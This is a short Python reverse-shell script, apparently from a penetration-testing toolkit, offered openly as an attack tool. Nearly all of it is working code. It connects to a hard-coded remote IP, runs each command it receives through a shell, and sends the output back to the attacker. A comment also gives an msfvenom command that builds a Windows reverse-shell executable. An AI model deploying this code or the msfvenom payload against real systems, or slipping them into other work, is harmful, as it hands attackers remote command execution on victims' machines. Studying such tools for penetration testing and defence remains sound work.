#!/usr/bin/python
# Simple Reverse Shell Written by: Dave Kennedy (ReL1K)
#
# or use 
# msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe > danger.exe

import socket
import subprocess

HOST = '192.168.225.136'    # The remote host
PORT = 443            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
# loop forever
while 1:
    # recv command line param
    data = s.recv(1024)
    # execute command line
    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    # grab output from commandline
    stdout_value = proc.stdout.read() + proc.stderr.read()
    # send back to attacker
    s.send(stdout_value)
# quit out afterwards and kill socket
s.close()




